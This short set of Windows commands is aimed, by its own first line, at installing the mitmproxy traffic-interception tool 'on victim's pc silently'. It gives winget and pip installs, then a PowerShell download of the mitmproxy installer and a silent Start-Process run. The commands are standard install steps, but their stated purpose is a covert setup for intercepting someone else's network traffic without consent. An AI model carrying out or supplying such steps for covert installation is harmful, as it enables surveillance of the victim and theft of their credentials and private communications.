Run the command below to install mitmproxy installer on victim's pc silently


First, install python:
	winget install Python.Python.3

Then, install mitmproxy:
	python -m pip install mitmproxy

Finally, verify installation:
	mitmproxy --version


This is not needed:

Invoke-WebRequest -Uri "https://downloads.mitmproxy.org/11.1.0/mitmproxy-11.1.0-windows-x86_64-installer.exe" -OutFile "C:\path\to\save\mitmproxy-installer.exe"


Then execute it 

Start-Process -FilePath "C:\path\to\mitmproxy-installer.exe" -ArgumentList "/S" -NoNewWindow -Wait

